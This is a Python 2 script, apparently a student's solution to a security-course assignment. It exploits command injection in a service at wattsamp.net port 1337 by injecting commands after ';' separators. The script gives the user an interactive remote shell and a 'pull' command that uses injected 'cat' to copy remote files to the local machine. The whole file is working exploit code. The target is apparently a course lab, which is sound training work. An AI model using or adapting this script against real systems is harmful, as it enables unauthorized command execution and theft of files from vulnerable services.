"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time

host = "wattsamp.net" # IP address here
port = 1337 # Port here

def execute_cmd(cmd, pwd):
    #print("cmd: " + cmd)
    directory_arr = pwd.split("/")
    change_directory_cmd = "; cd " + pwd
    #if pwd != "/":
    #    for directory in directory_arr:
    #        if directory != "":
    #            change_directory_cmd = change_directory_cmd + "cd " + directory + "; "
        
    #print change_directory_cmd
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data = s.recv(1024)
    #print (data)
    cmd = "; " + cmd + "; pwd; " + "\n"
    cmd = change_directory_cmd + cmd
    #print("cmd: " + cmd)
    s.send(cmd)
    time.sleep(.5)
    data = s.recv(1024)
    #print (data)
    s.close()
    
    data_lines = data.splitlines()
    new_pwd = data_lines[len(data_lines)-1]
    data = data.replace(new_pwd, "")
    data = data.rstrip()
    print (data)
    return new_pwd
    
def print_help():
    return "Ussage:\n\'Shell\': Drop into an interactive shell and allow users to gracefully exit\n\'pull <remote-path> <local-path>\': Download files\n\'help\': Shows this help menu\n\'quit\': Quit the shell"
    
def pull_stuff(cmd_array):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data = s.recv(1024)
    
    command = "; cat " + cmd_array[1]    
    s.send(command)
    time.sleep(.5)
    data = s.recv(1024)
    
    f = open(cmd_array[2], "w+")
    f.write(data)
    f.close()
    s.close()
    
def shell_script():
    pwd = "/"
    
    while (True):
        cmd = raw_input(pwd + "> ")
        if cmd == "exit":
            break 
        else:
            pwd = execute_cmd(cmd, pwd)

if __name__ == '__main__':
    while (True):
        cmd = raw_input("the_shell> ")
        if cmd == "exit":
            break
        elif cmd == "shell":
            shell_script()
        elif cmd == "help":
            print (print_help())
        else:
            cmd_array = cmd.split()
            if cmd_array[0] == "pull":
                if len(cmd_array) != 3:
                    print (print_help())
                else:
                    pull_stuff(cmd_array)
            else:
                print (print_help())
                
               
    
    
    
